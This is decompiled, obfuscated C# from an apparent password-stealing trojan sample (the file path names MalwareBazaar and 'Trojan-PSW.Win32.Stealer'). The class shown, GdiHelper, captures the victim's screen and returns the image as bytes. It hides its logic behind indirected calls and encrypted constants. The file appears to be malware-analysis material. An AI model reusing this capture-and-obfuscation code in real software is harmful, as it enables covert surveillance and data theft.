// Decompiled with JetBrains decompiler
// Type: GdiHelper
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.CompilerServices;

public static class GdiHelper
{
  public static double GetWindowsScreenScalingFactor(bool percentage = true)
  {
    Graphics pathList1 = ContextService.RegisterFile(IntPtr.Zero);
    IntPtr generatorCache = ConfigSettings.RegisterFile((object) pathList1);
    GdiHelper.DatabaseFactory pathList2 = MemoryImport.Func<GdiHelper.DatabaseFactory>(MenuSet.RegisterFile(ConditionCollection.RegisterFile(PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(4776), StreamProvider.RegisterFile(4827), string.Empty)), PartitionHelper.RegisterFile((object) StreamProvider.RegisterFile(4848), StreamProvider.RegisterFile(4947), string.Empty)));
    int num = WindowStream.RegisterFile((object) pathList2, generatorCache, TemplateService.RegisterFile(3064));
    double screenScalingFactor = AssemblyQueue.RegisterFile((double) WindowStream.RegisterFile((object) pathList2, generatorCache, TemplateService.RegisterFile(3068)) / (double) num, TemplateService.RegisterFile(3072));
    if (percentage)
    {
label_1:
      switch (6)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (GdiHelper.GetWindowsScreenScalingFactor);
          }
          screenScalingFactor *= TemplateService.RegisterFile(3076);
          break;
      }
    }
    IconProvider.RegisterFile((object) pathList1, generatorCache);
    ClientEditor.RegisterFile((object) pathList1);
    return screenScalingFactor;
  }

  public static object MonitorSize()
  {
    try
    {
      double num = DiskDesigner.RegisterFile(TemplateService.RegisterFile(3084) != 0);
      Rectangle pathList = NetworkConverter.RegisterFile((object) OutlineInvoker.RegisterFile());
      double width = (double) PageScope.RegisterFile(ref pathList) * num;
      pathList = NetworkConverter.RegisterFile((object) OutlineInvoker.RegisterFile());
      double height = (double) StoreSite.RegisterFile(ref pathList) * num;
      return (object) new Size((int) width, (int) height);
    }
    catch
    {
      Rectangle pathList = NetworkConverter.RegisterFile((object) OutlineInvoker.RegisterFile());
      return (object) CommandInfo.RegisterFile(ref pathList);
    }
  }

  public static byte[] GetImageBase()
  {
    try
    {
      object obj = AspectFactory.InvokeStub();
      // ISSUE: reference to a compiler-generated field
      if (GdiHelper.StreamService.pathList == null)
      {
label_1:
        switch (1)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (GdiHelper.GetImageBase);
            }
            int pathList = TemplateService.RegisterFile(3088);
            // ISSUE: type reference
            Type generatorCache = GroupType.RegisterFile(__typeref (GdiHelper));
            CSharpArgumentInfo[] previousHandler = new CSharpArgumentInfo[TemplateService.RegisterFile(3092)];
            previousHandler[TemplateService.RegisterFile(3096)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3100), (string) null);
            previousHandler[TemplateService.RegisterFile(3104)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3108), (string) null);
            previousHandler[TemplateService.RegisterFile(3112)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3116), (string) null);
            // ISSUE: reference to a compiler-generated field
            GdiHelper.StreamService.pathList = PartitionType.RegisterFile(ConditionResolver.RegisterFile((CSharpBinderFlags) pathList, generatorCache, (IEnumerable<CSharpArgumentInfo>) previousHandler));
            break;
        }
      }
      // ISSUE: reference to a compiler-generated field
      Func<CallSite, Type, object, object, System.Drawing.Bitmap> target = GdiHelper.StreamService.pathList.Target;
      // ISSUE: reference to a compiler-generated field
      CallSite<Func<CallSite, Type, object, object, System.Drawing.Bitmap>> pathList1 = GdiHelper.StreamService.pathList;
      // ISSUE: type reference
      Type previousHandler1 = GroupType.RegisterFile(__typeref (System.Drawing.Bitmap));
      // ISSUE: reference to a compiler-generated field
      if (GdiHelper.StreamService.pathList == null)
      {
label_6:
        switch (3)
        {
          case 0:
            goto label_6;
          default:
            int pathList2 = TemplateService.RegisterFile(3120);
            string generatorCache = StreamProvider.RegisterFile(4972);
            // ISSUE: type reference
            Type previousHandler2 = GroupType.RegisterFile(__typeref (GdiHelper));
            CSharpArgumentInfo[] namesEnabled = new CSharpArgumentInfo[TemplateService.RegisterFile(3124)];
            namesEnabled[TemplateService.RegisterFile(3128)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3132), (string) null);
            // ISSUE: reference to a compiler-generated field
            GdiHelper.StreamService.pathList = DatabaseProvider.RegisterFile(EmulatorStream.RegisterFile((CSharpBinderFlags) pathList2, generatorCache, previousHandler2, (IEnumerable<CSharpArgumentInfo>) namesEnabled));
            break;
        }
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object namesEnabled1 = PartitionList.RegisterFile((object) GdiHelper.StreamService.pathList.Target, (CallSite) GdiHelper.StreamService.pathList, obj);
      // ISSUE: reference to a compiler-generated field
      if (GdiHelper.StreamService.generatorCache == null)
      {
label_9:
        switch (2)
        {
          case 0:
            goto label_9;
          default:
            int pathList3 = TemplateService.RegisterFile(3136);
            string generatorCache = StreamProvider.RegisterFile(4983);
            // ISSUE: type reference
            Type previousHandler3 = GroupType.RegisterFile(__typeref (GdiHelper));
            CSharpArgumentInfo[] namesEnabled2 = new CSharpArgumentInfo[TemplateService.RegisterFile(3140)];
            namesEnabled2[TemplateService.RegisterFile(3144)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3148), (string) null);
            // ISSUE: reference to a compiler-generated field
            GdiHelper.StreamService.generatorCache = DatabaseProvider.RegisterFile(EmulatorStream.RegisterFile((CSharpBinderFlags) pathList3, generatorCache, previousHandler3, (IEnumerable<CSharpArgumentInfo>) namesEnabled2));
            break;
        }
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object valuesMap1 = PartitionList.RegisterFile((object) GdiHelper.StreamService.generatorCache.Target, (CallSite) GdiHelper.StreamService.generatorCache, obj);
      System.Drawing.Bitmap pathList4 = OutlineConverter.RegisterFile((object) target, (CallSite) pathList1, previousHandler1, namesEnabled1, valuesMap1);
      Graphics graphics = ActivityEventArgs.RegisterFile((Image) pathList4);
      try
      {
        StreamEditor.RegisterFile((object) graphics, (InterpolationMode) TemplateService.RegisterFile(3152));
        PluginType.RegisterFile((object) graphics, (PixelOffsetMode) TemplateService.RegisterFile(3156));
        BookmarkCollection.RegisterFile((object) graphics, (SmoothingMode) TemplateService.RegisterFile(3160));
        // ISSUE: reference to a compiler-generated field
        if (GdiHelper.StreamService.pathList == null)
        {
label_13:
          switch (6)
          {
            case 0:
              goto label_13;
            default:
              int pathList5 = TemplateService.RegisterFile(3164);
              string generatorCache = StreamProvider.RegisterFile(4996);
              // ISSUE: type reference
              Type namesEnabled3 = GroupType.RegisterFile(__typeref (GdiHelper));
              CSharpArgumentInfo[] valuesMap2 = new CSharpArgumentInfo[TemplateService.RegisterFile(3168)];
              valuesMap2[TemplateService.RegisterFile(3172)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3176), (string) null);
              valuesMap2[TemplateService.RegisterFile(3180)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3184), (string) null);
              valuesMap2[TemplateService.RegisterFile(3188)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3192), (string) null);
              valuesMap2[TemplateService.RegisterFile(3196)] = EmulatorLayout.RegisterFile((CSharpArgumentInfoFlags) TemplateService.RegisterFile(3200), (string) null);
              // ISSUE: reference to a compiler-generated field
              GdiHelper.StreamService.pathList = DriveTable.RegisterFile(AssistantEditor.RegisterFile((CSharpBinderFlags) pathList5, generatorCache, (IEnumerable<Type>) null, namesEnabled3, (IEnumerable<CSharpArgumentInfo>) valuesMap2));
              break;
          }
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ActionAttribute.RegisterFile((object) GdiHelper.StreamService.pathList.Target, (CallSite) GdiHelper.StreamService.pathList, graphics, new Point(TemplateService.RegisterFile(3204), TemplateService.RegisterFile(3208)), new Point(TemplateService.RegisterFile(3212), TemplateService.RegisterFile(3216)), obj);
      }
      finally
      {
        if (graphics != null)
        {
label_17:
          switch (7)
          {
            case 0:
              goto label_17;
            default:
              DeploymentDesigner.RegisterFile((object) graphics);
              break;
          }
        }
      }
      return GdiHelper.RegisterFile((Image) pathList4);
    }
    catch (Exception ex)
    {
      return (byte[]) null;
    }
  }

  private static byte[] RegisterFile(Image pathList)
  {
    try
    {
      if (pathList == null)
      {
label_1:
        switch (4)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (GdiHelper.RegisterFile);
            }
            return (byte[]) null;
        }
      }
      else
      {
        MemoryStream memoryStream = DialogSite.RegisterFile();
        try
        {
          DriveLayout.RegisterFile((object) pathList, (Stream) memoryStream, OutlineResolver.RegisterFile());
          return StoreScope.RegisterFile((object) memoryStream);
        }
        finally
        {
          if (memoryStream != null)
          {
label_8:
            switch (7)
            {
              case 0:
                goto label_8;
              default:
                DeploymentDesigner.RegisterFile((object) memoryStream);
                break;
            }
          }
        }
      }
    }
    catch (Exception ex)
    {
      return (byte[]) null;
    }
  }

  private delegate int DatabaseFactory(IntPtr hDC, int nIndex);

  public enum DeviceCap
  {
    VERTRES = 10, // 0x0000000A
    DESKTOPVERTRES = 117, // 0x00000075
  }
}
